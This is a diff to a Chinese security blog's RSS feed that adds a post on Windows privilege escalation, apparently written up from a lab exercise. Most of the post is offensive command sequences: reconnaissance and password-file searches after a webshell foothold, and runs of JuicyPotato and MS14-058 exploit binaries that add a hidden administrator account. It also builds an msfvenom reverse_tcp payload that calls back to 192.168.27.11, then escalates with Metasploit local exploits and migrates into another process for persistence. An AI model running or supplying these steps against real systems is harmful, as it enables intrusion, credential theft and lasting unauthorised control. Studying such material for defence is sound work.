@@ -5,8 +5,155 @@
         <link>http://gyzero.shop</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Thu, 09 Nov 2023 10:54:44 +0800</pubDate>
-        <lastBuildDate>Thu, 09 Nov 2023 10:54:44 +0800</lastBuildDate>
+        <pubDate>Thu, 09 Nov 2023 20:28:50 +0800</pubDate>
+        <lastBuildDate>Thu, 09 Nov 2023 20:28:50 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://gyzero.shop/2023/11/09/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</guid>
+            <title>Windows提权</title>
+            <link>http://gyzero.shop/2023/11/09/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/</link>
+            <pubDate>Thu, 09 Nov 2023 20:28:50 +0800</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;提权基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权基础&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;提权基础&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利&lt;/p&gt;
+&lt;p&gt;windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。&lt;/p&gt;
+&lt;p&gt;使用 Windows 命令提示符执行的，它将系统信息输出到名为 &amp;quot;a.txt&amp;quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &amp;quot;a.txt&lt;/p&gt;
+&lt;p&gt;systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png&#34; alt=&#34;image-20231110225111274&#34;&gt;&lt;/p&gt;
+&lt;p&gt;提权辅助:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v&#34;&gt;https://i.hacking8.com/tiquan/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;windows 漏洞集合&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=&#34;&gt; https://github.com/SecWiki/windows-kernel-exploits&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;收集信息常用命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#收集信息常用命令&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;收集信息常用命令&lt;/span&gt;&lt;/h3&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig /all                                            --网卡配置&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;systeminfo                                               --系统补丁信息等&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic product get name,version                            --安装软件、版本、路径&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wmic service list brief                                  --查询本机服务信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tasklist -svc                                            --进程查看&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;schtasks /query /fo list /v                              --任务计划查询&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net statistics workstation                               --开机时间&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user                                                 --查看用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whoami /all                                              --SID等用户信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net localgroup administrators                            --查看管理员组中的用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net session                                              --会话查看&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;netstat -ano                                             --网络连接以及通过端口判断服务&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net share                                                --共享&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;route print                                              --路由信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp -a                                                   --arp信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cmdkey /l                                                --登录历史&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hosts文件  Linux：/etc/hosts  Windows：c:\Windows\system32\drivers\etc\hosts&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ipconfig  /displaydns                                    --dns缓存&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net view                                                 --查看共享&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dir /s /b &#34;pass&#34; &#34;user&#34; &#34;config&#34; &#34;username.&#34; &#34;password.&#34; --命令行查找敏感文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;findstr  /s /m &#34;password&#34; *.*                            --寻找包含密码字段的文件，如数据库密码文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user /domain                                         --查看域用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net time /domain                                         --查看时间服务器（可能为DC）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &#34;domain admins&#34; /domain                        --查看域管理员&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &#34;domaincontrollers&#34; /domain                    --查看域控制器&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;net user 显示当前系统中的所有用户信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110133913521.png&#34; alt=&#34;image-20231110133913521&#34;&gt;&lt;/p&gt;
+&lt;p&gt;net user 31166 查看用户详细信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134358877.png&#34; alt=&#34;image-20231110134358877&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;whoami-all&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whoami-all&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;whoami /all&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;获取当前用户详细信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134649977.png&#34; alt=&#34;image-20231110134649977&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;hostname&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hostname&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;hostname&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;获取主机名&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134745836.png&#34; alt=&#34;image-20231110134745836&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;whoami-priv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whoami-priv&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;whoami /priv&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;获取当前用户的安全特权&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110134929728.png&#34; alt=&#34;image-20231110134929728&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;net-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#net-start&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;net start&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;获取已经启动的 Windows 服务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110135119067.png&#34; alt=&#34;image-20231110135119067&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;systeminfo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#systeminfo&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;systeminfo&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;获取电脑打了那些补丁为之后提权打下基础&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151656666.png&#34; alt=&#34;image-20231110151656666&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;扫描可写可读目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扫描可写可读目录&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;扫描可写可读目录&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110151233596.png&#34; alt=&#34;image-20231110151233596&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;windows常用提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows常用提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;windows 常用提权&lt;/span&gt;&lt;/h3&gt;
+&lt;h4 id=&#34;ms16-075烂土豆提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms16-075烂土豆提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;MS16-075 烂土豆提权&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;影响版本：Windows 7、Windows 8.1、Windows 10、Windows Server 2008、Windows Server 2012 等&lt;/p&gt;
+&lt;p&gt;下载网址&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1N3ZWV0UG90YXRv&#34;&gt;https://github.com/uknowsec/SweetPotato&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0p1aWN5UG90YXRvL2Jsb2IvbWFpbi9KdWljeVBvdGF0by1zaGVsbGNvZGUvQmluL0p1aWN5UG90YXRvLmV4ZQ==&#34;&gt;https://github.com/uknowsec/JuicyPotato/blob/main/JuicyPotato-shellcode/Bin/JuicyPotato.exe&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;找到了可读写目录上传 exe&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110153059031.png&#34; alt=&#34;image-20231110153059031&#34;&gt;&lt;/p&gt;
+&lt;p&gt;执行命令&lt;/p&gt;
+&lt;p&gt;C:\inetpub\wwwroot\dedecms\JuicyPotato_x64.exe net user yunyi2 1234567890 /add &amp;amp;&amp;amp; net localgroup administrators yunyi/add&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110160256590.png&#34; alt=&#34;image-20231110160256590&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;ms14-058提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms14-058提权&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;MS14-058 提权&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;具体而言，win32k.sys 是 Windows 子系统的一部分，负责窗口管理和屏幕输出。如果内核模块未正确处理内存中的对象，攻击者可能会通过利用这一漏洞来在内核模式中执行任意代码。成功利用此漏洞的攻击者可以在系统中运行具有更高权限的代码，进而执行一系列危险操作，如安装程序、查看、更改或删除数据，或者创建具有完全管理权限的新账户。&lt;/p&gt;
+&lt;p&gt;影响版本&lt;br&gt;
+ Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下&lt;/p&gt;
+&lt;p&gt;上传 exe 到可执行目录&lt;/p&gt;
+&lt;p&gt;whoami 看到已经是 nt authority\system&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182725492.png&#34; alt=&#34;image-20231110182725492&#34;&gt;&lt;/p&gt;
+&lt;p&gt;64.exe “net user yunyi 123456 /add” 添加用户&lt;/p&gt;
+&lt;p&gt;64.exe &amp;quot;net localgroup administrators yunyi /add&amp;quot; 添加到管理员组&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182123803.png&#34; alt=&#34;image-20231110182123803&#34;&gt;&lt;/p&gt;
+&lt;p&gt;远程端口连接成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110182617605.png&#34; alt=&#34;image-20231110182617605&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;cve-2020-0787&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2020-0787&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;CVE-2020-0787&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;影响版本&lt;/p&gt;
+&lt;p&gt;Windows 10 Version 1809 for ARM64-based Systems&lt;br&gt;
+Windows Server 2008 for 32-bit Systems Service Pack 2&lt;br&gt;
+Windows RT 8.1&lt;br&gt;
+Windows 8.1 for x64-based systems&lt;br&gt;
+Windows 8.1 for 32-bit systems&lt;br&gt;
+Windows 7 for x64-based Systems Service Pack 1&lt;br&gt;
+Windows 7 for 32-bit Systems Service Pack 1&lt;br&gt;
+Windows Server 2016 (Server Core installation)&lt;br&gt;
+Windows Server 2016&lt;br&gt;
+Windows 10 Version 1607 for x64-based Systems&lt;br&gt;
+Windows 10 Version 1607 for 32-bit Systems&lt;br&gt;
+Windows 10 for x64-based Systems&lt;br&gt;
+Windows 10 for 32-bit Systems&lt;br&gt;
+Windows Server, version 1903 (Server Core installation)&lt;br&gt;
+Windows 10 Version 1903 for ARM64-based Systems&lt;br&gt;
+Windows 10 Version 1903 for x64-based Systems&lt;br&gt;
+Windows 10 Version 1903 for 32-bit Systems&lt;br&gt;
+Windows 10 Version 1709 for ARM64-based Systems&lt;br&gt;
+Windows 10 Version 1709 for x64-based Systems&lt;br&gt;
+Windows 10 Version 1709 for 32-bit Systems&lt;br&gt;
+Windows Server, version 1909 (Server Core installation)&lt;br&gt;
+Windows 10 Version 1909 for ARM64-based Systems&lt;br&gt;
+Windows 10 Version 1909 for x64-based Systems&lt;br&gt;
+Windows 10 Version 1909 for 32-bit Systems&lt;br&gt;
+Windows Server 2019 (Server Core installation)&lt;br&gt;
+Windows Server 2019&lt;br&gt;
+Windows Server 2012 R2 (Server Core installation)&lt;br&gt;
+Windows Server 2012 R2&lt;br&gt;
+Windows Server 2012 (Server Core installation)&lt;br&gt;
+Windows Server 2012&lt;br&gt;
+Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)&lt;br&gt;
+Windows Server 2008 R2 for x64-based Systems Service Pack 1&lt;br&gt;
+Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)&lt;br&gt;
+Windows Server 2008 for x64-based Systems Service Pack 2&lt;br&gt;
+Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)&lt;br&gt;
+Windows 10 Version 1809 for x64-based Systems&lt;br&gt;
+Windows 10 Version 1809 for 32-bit Systems&lt;br&gt;
+Windows 10 Version 1803 for ARM64-based Systems&lt;br&gt;
+Windows Server, version 1803 (Server Core Installation)&lt;br&gt;
+Windows 10 Version 1803 for x64-based Systems&lt;br&gt;
+Windows 10 Version 1803 for 32-bit Systems&lt;/p&gt;
+&lt;p&gt;脚本地址&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Nid2FuZzUwNS9DVkUtMjAyMC0wNzg3LUVYUC1BTEwtV0lORE9XUy1WRVJTSU9OL3JlbGVhc2VzL3RhZy8x&#34;&gt;https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/tag/1&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;要求上桌面执行，会弹出系统权限的 cmd&lt;/p&gt;
+&lt;p&gt;把 exe 上传后切换上面创建的用户登陆桌面&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185051791.png&#34; alt=&#34;image-20231110185051791&#34;&gt;&lt;/p&gt;
+&lt;p&gt;执行后弹出 cmd&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185214126.png&#34; alt=&#34;image-20231110185214126&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110185227277.png&#34; alt=&#34;image-20231110185227277&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;msf利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf利用&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label&#34;&gt;msf 利用&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;先生成一个木马文件&lt;/p&gt;
+&lt;p&gt;msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=8989-f exe &amp;gt;/vs.exe&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110211226995.png&#34; alt=&#34;image-20231110211226995&#34;&gt;&lt;/p&gt;
+&lt;p&gt;msf 打开监听&lt;/p&gt;
+&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
+&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
+&lt;p&gt;set lhost 192.168.27.11&lt;/p&gt;
+&lt;p&gt;set lport 8989&lt;/p&gt;
+&lt;p&gt;exploit&lt;/p&gt;
+&lt;p&gt;用 webshell 上传到受害机执行木马文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213027928.png&#34; alt=&#34;image-20231110213027928&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110213439218.png&#34; alt=&#34;image-20231110213439218&#34;&gt;&lt;/p&gt;
+&lt;p&gt;跟之前一样查看打了那些补丁&lt;/p&gt;
+&lt;p&gt;输入 shell 获取 cmd 使用 systeminfo 获取到信息后跟之前一样去找可以用的提权&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214317729.png&#34; alt=&#34;image-20231110214317729&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用 background 命令把会话放在后台，可以用 session 查看已建立的会话信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214725591.png&#34; alt=&#34;image-20231110214725591&#34;&gt;&lt;/p&gt;
+&lt;p&gt;search ms14_058 查找漏洞信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110214943295.png&#34; alt=&#34;image-20231110214943295&#34;&gt;&lt;/p&gt;
+&lt;p&gt;use exploit/windows/local/ms14_058_track_popup_menu&lt;/p&gt;
+&lt;p&gt;show options 查看利用要求&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110215511454.png&#34; alt=&#34;image-20231110215511454&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置会话 id 刚才看的是 session 2 所以设置为 2&lt;/p&gt;
+&lt;p&gt;set session 2&lt;/p&gt;
+&lt;p&gt;然后 exploit 执行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110220237813.png&#34; alt=&#34;image-20231110220237813&#34;&gt;&lt;/p&gt;
+&lt;p&gt;use exploit/windows/local/ms16_075_reflection_juicy&lt;/p&gt;
+&lt;p&gt;ms14_058 没有成功所以换了 ms16 _075 成功获取 system 权限&lt;/p&gt;
+&lt;p&gt;切换 shell 添加用户并加入管理员&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221425934.png&#34; alt=&#34;image-20231110221425934&#34;&gt;&lt;/p&gt;
+&lt;p&gt;维权&lt;/p&gt;
+&lt;p&gt;ps 列出进程&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110221951490.png&#34; alt=&#34;image-20231110221951490&#34;&gt;&lt;/p&gt;
+&lt;p&gt;migrate 1184&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110222507771.png&#34; alt=&#34;image-20231110222507771&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://gyzero.shop/2023/11/09/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</guid>
             <title>文件上传漏洞</title>
